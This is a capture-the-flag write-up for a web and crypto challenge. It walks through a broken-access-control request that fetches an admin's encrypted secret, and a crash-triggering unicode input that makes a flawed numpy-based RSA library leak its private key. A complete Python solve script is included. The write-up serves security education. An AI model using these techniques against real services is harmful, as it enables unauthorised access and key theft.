# Trust Issues


## A little bit of context

The challenge starts with a simple and horrendous website. A pretty obvious goal is stated in the index page: **`But will you find my own secret?`**

When you go on the page linked with this sentence you don't have access to the secret because `You don't have the rights to get it`.

Another link in the index.html go to another page allowing the user to encrypt and send messages to the api.

In the footer, two links leads to an about and a contact page. There is nothing on the contact page but on the about one, some thanks are stated. It confirms the the website use Python and credit FastApi but just after that a library called "timosbadlibraries" is mentioned.

Lastly a login page provides a form to login and gives a way to connect anonyously.

Now that the context is given, we can explain how to solve it. 

## Solution

This challenge has three distinct steps:
- Get the private key
- Find the library behind the server then analyse it.
- Exploit the bad RSA implementation

I will give a python solve script at the end but I will explaint every steps a CTF participant should have taken.

The fist two steps can be done independantly. After they are passed, the real exploit begin.

### Finding the encrypted secret

To do so, a simple api vulnerability is used. It is a bit guessy as the login form may be miss-leading, however, the independant verification of the validity token and a user rights is a common mistake.

The anonymous token is sufficient ant the admin id is 2 so to get the encrypted flag, we need to use these path parameters

`/get/secret?token=anonymous&user_id=2`

### Getting the library

The library is publicly on the web in two different spots:
- [github]()
- [pypi]()

The simplest and more natural way to get it is to use pip (or to search on pypi) since it is the default pyton package manager. 

`python3 -m pip install timosbadlibrary`

### Analysing the library

To people coding secure libs, the use of `np.empty` function should trigger an alert in their brain. Like when coding in C, and python is in fact more about C code than anything else, an empty array preserve previous memory allocation.

Testing locally will prove that the pointers used by numpy to allocate the arrays are always the same, just offsetting by 1 every time the two arrays are created (I might see what is inside this function to uderstand completely the reason behind the rotation even though I have an idea why).

Now we can inspect the server in the library and we see that the library recreate a new RSA class instance, log a reason why the change is made and then generate a new key pair. So if we crash the function logging the reason, the new pair won't be generated but the arrays will be created, and as the offet move, the public key array pointer will be set on the last private key pointer after two crashes.

Finaly, to crash the function, a simple unicode character passed to the `encode` method will do the job!

### Bringing everything together

```py
import requests
import json
from timosbadlibraries.RSAServer import RSA      #   python3 -m pip install timosbadlibraries

url = "http://127.0.0.1" # to change by yours

requests.put(url + '/put/change_key', json={'reason': 'Starting'})

# get the public key"
r = requests.get(url + '/get/public_key')
pubKey = json.loads(r.content)['public_key']

# get e and n
e = int(pubKey['e']).to_bytes(256)
n = int(pubKey['n']).to_bytes(256)

# get encrypted flag
r = requests.get(url + '/get/secret?token=anonymous&user_id=2')
secret = json.loads(r.content)['secret']

# trigger error to exploit numpy's empty function
requests.put(url + '/put/change_key', json={'reason': '\ud861'})
requests.put(url + '/put/change_key', json={'reason': '\ud861'})

# get public key that is in fact the private key after the exploit
r = requests.get(url + '/get/public_key')
privKey = json.loads(r.content)['public_key']

# get d
d = int(privKey['e']).to_bytes(256)
# n = int(privKey['n']).to_bytes(256)        == int(pubKey['n']).to_bytes(256)

# using the lib because it is easyer
rsa = RSA()

# loading the parameters, no neet to generate keys...
rsa.private_key[0] = n
rsa.public_key[0] = n
rsa.private_key[1] = d
rsa.public_key[1] = e

# decrypt the flag
flag = rsa.decrypt(int(secret))
print(flag)
```


